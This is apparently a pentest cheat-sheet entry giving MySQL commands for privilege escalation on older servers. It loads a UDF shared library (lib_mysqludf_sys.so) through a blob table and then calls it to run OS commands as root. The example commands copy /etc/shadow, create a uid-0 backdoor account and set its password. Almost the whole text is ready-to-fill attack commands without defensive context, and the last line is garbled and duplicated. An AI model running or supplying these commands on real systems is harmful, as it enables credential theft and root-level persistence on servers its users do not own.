# Database

```text
MySQL <5.0 User Defined Functionscommand execution and privilege escalation with mysql 
running as root/SYSTEMmysql> use mysql;
mysql> create table <table-name>(line blob);
mysql> insert into <table-name> values(load_file('<path-to-udf.so-file>');
mysql> select * from <table-name> into dumpfile '/usr/lib/lib_mysqludf_sys.so';
mysql> create function <name_of_new_function> returns int soname 'lib_mysqludf_sys.so';
Example command execution with the new function:
mysql> set @status := <name_of_new_function>('cat /etc/shadow > /tmp/shadow');
mysql> set @status := <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');
mysql> set @status := <name_of_new_function>('echo <new-username>:<chosen-password> | /usr/sbin/chpasswd');
mysql> select <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>');| <name_of_new_function>('/usr/sbin/useradd -o -u0 -g0 -d /dev/null -s /bin/bash &new-username>'); 
```



